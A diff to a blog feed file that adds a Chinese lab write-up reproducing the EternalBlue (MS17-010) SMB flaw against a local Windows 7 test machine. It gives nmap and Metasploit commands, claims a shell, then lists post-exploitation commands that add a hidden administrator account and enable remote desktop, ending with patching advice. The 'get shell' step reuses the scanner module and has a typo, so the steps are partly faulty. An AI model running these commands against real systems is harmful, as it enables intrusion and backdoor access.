@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>永恒之蓝漏洞(ms17-010)复现</title>
+      <link href="/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/"/>
+      <url>/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，无需用户进行任何操作，就可以中招。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>目前已知受影响的Windows 版本包括但不限于：<br>WindowsNT<br>Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8<br>Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 SP0</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：kali 2.0<br>靶机：Windows 7 X64 （192.168.159.133）</p><h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><h3 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h3><p><code>nmap -r 192.168.159.0/24C</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807171738.png" alt></p><h3 id="使用msf扫描模块"><a href="#使用msf扫描模块" class="headerlink" title="使用msf扫描模块"></a>使用msf扫描模块</h3><p> kali 执行 <code>msfconsole</code> 进入MSF框架</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172414.png" alt></p><p>搜索ms17_010<br><code>search ms17_010</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172807.png" alt></p><p>使用ms17-010扫描模块，对靶机Win7进行扫描<br>使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p><p>执行<br><code>run</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173247.png" alt></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p><p>查看选项<br><code>shwo options</code></p><p>执行<br><code>exploit</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173713.png" alt></p><p>成功拿到shell<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807174031.png" alt></p><h2 id="控制提权"><a href="#控制提权" class="headerlink" title="控制提权"></a>控制提权</h2><p>windows shell 下执行：<br>新建用户<br><code>net user dylan 123456 /add</code></p><p>添加管理组<br><code>net localgroup administrators dylan /add</code></p><p>开启远程桌面<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p>kali 登陆远程桌面：<br><code>rdesktop 192.168.159.133:3389</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807175105.png" alt></p><hr><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><ul><li>在线更新：开启Windows Update更新。</li><li>打补丁：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener">点击下载</a></li></ul><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/193681.html" target="_blank" rel="noopener">永恒之蓝漏洞复现(ms17-010)</a><br><a href="https://blog.51cto.com/chenxinjie/2092754?from=timeline" target="_blank" rel="noopener">MS17-010 基于”永恒之蓝”实现Windows Getshell</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Information Security </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+            <tag> 复现 </tag>
+            
+            <tag> 永恒之蓝漏洞 </tag>
+            
+            <tag> ms17-010 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WebLogic WLS组件漏洞复现</title>
       <link href="/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/"/>
       <url>/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/</url>
